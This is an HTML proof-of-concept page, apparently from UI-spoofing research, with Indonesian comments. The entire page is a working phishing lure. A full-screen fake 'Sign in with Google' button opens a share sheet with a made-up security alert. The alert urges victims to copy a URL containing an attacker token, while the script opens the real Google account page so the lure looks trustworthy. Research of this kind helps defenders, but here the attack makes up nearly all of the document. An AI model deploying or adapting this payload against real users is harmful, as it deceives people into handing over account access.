<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC - UI Spoofing Research</title>
    <style>
        body { margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; background: #ffffff; font-family: 'Roboto', sans-serif; }
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; cursor: pointer; display: flex; align-items: center; justify-content: center; }
        .google-btn { 
            display: flex; align-items: center; padding: 10px 24px; border: 1px solid #dadce0; 
            border-radius: 4px; font-weight: 500; color: #3c4043; font-size: 14px;
        }
    </style>
</head>
<body>

    <div id="overlay">
        <div class="google-btn">
            <img src="https://www.google.com/favicon.ico" style="margin-right: 10px; width: 18px;">
            Sign in with Google
        </div>
    </div>

    <script>
        const overlay = document.getElementById('overlay');

        overlay.addEventListener('click', async () => {
            // Deskripsi yang sangat meyakinkan seolah-olah dari OS
            const shareData = {
                title: 'Identity Verification Required',
                text: 'Security Alert: Your Google Account requires synchronization. Click "Copy to clipboard" to verify your session.',
                url: 'https://google.com/accounts/verify?token=ATTACKER_ID_12345' 
            };

            // EKSEKUSI SIMULTAN
            // 1. Pemicu Share (Tanpa Await)
            if (navigator.share) {
                navigator.share(shareData).catch(() => {});
            }

            // 2. Navigasi ke Situs Asli (Untuk membangun kepercayaan)
            window.open('https://myaccount.google.com/', '_blank');
        });
    </script>
</body>
</html>
